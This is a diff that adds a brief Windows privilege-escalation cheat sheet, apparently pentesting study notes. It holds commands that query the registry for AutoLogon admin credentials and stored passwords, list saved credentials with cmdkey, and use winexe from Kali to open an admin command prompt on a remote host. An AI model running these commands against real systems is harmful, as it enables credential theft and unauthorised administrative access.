@@ -1,0 +1,13 @@
+# Query specific key to find admin AutoLogon credentials:
+    reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+# Search password contains items in registry
+    reg query HKLM /f password /t REG_SZ /s
+
+# On Kali, use the winexe command to spawn a command prompt running with the
+admin privileges (update the password with the one you found):
+    winexe -U '<admin_username>%<password>' //<host_IP> cmd.exe
+
+
+# List any saved credentials:
+    cmdkey /list
